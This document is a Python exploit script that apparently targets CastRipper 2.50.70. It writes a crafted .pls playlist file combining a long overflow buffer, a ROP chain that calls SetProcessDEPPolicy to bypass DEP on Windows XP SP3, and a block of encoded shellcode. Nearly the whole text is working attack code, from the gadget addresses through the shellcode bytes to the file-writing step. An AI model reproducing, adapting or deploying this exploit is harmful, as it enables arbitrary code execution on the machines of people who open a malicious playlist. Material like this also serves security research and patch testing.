# Castripper 2.50.70 (.pls) exploit (Stack buffer overflow/DEP bypass)
# Download: http://www.mini-stream.net/castripper/
# Tested on Wind0ws XP SP3 DEP:OptOut
# Author: Lu_c_fer ------>>> Lu_c_fer@aol.com

# All ROP gadgets are from the APP's DLLs except for the hardcoded SetProcessDEPPolicy() address



import struct

f = open("Eploit_SetProcessDEPPolicy.pls", "w")

crash = "\x41"*26076

rop = struct.pack("<I", 0x10010e0d)   # POP EDX # RETN
rop += struct.pack("<I", 0x42424242)  # junk
rop += struct.pack("<I", 0x42424242)  # junk

#-----------------------Setting the pointer into EBP---------------------
rop += struct.pack("<I", 0x1003c03c)  # POP EBP # RETN
rop += struct.pack('<L', 0x7c862144)  # PTR to SetProcessDEPPolicy() 

#-----------------------EBX is will be 0x00000000
rop += struct.pack('<L', 0x1001ab37)  # POP EBX # RETN [CRfilter03.dll] 
rop += struct.pack('<L', 0xFFFFFFFF)  # 0x00000000 
rop += struct.pack('<L', 0x10010f68)  # INC EBX # CMP BYTE PTR SS:[EBP+5B],BL # RETN


rop += struct.pack('<L', 0x10023b57)  # POP EDI # RETN [CRfilter03.dll] 
rop += struct.pack('<L', 0x10041e68)  # skip 4 bytes [CRfilter03.dll]
rop += struct.pack('<L', 0x10010fb5)  # POP ESI # RETN
rop += struct.pack('<L', 0x10041e68)
rop += struct.pack('<L', 0x1001e4e0)  # PUSHAD # RETN [CRfilter03.dll] 



sc = ("\x89\xe1\xd9\xee\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49"
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"
"\x48\x47\x34\x43\x30\x45\x50\x45\x50\x4c\x4b\x51\x55\x47"
"\x4c\x4c\x4b\x43\x4c\x45\x55\x42\x58\x45\x51\x4a\x4f\x4c"
"\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a"
"\x4b\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x4a\x4e\x46"
"\x51\x49\x50\x4c\x59\x4e\x4c\x4d\x54\x49\x50\x42\x54\x45"
"\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4c"
"\x34\x47\x4b\x50\x54\x47\x54\x45\x54\x43\x45\x4b\x55\x4c"
"\x4b\x51\x4f\x47\x54\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44"
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c"
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4c\x49\x51\x4c\x46"
"\x44\x44\x44\x48\x43\x51\x4f\x50\x31\x4a\x56\x45\x30\x50"
"\x56\x42\x44\x4c\x4b\x51\x56\x50\x30\x4c\x4b\x51\x50\x44"
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x45"
"\x58\x4b\x39\x4a\x58\x4d\x53\x49\x50\x42\x4a\x50\x50\x43"
"\x58\x4a\x50\x4d\x5a\x44\x44\x51\x4f\x45\x38\x4a\x38\x4b"
"\x4e\x4c\x4a\x44\x4e\x50\x57\x4b\x4f\x4d\x37\x42\x43\x43"
"\x51\x42\x4c\x42\x43\x43\x30\x41\x41")

junk = "\x43"*5000

payload = crash + rop + sc + junk 

f.write(payload)

f.close()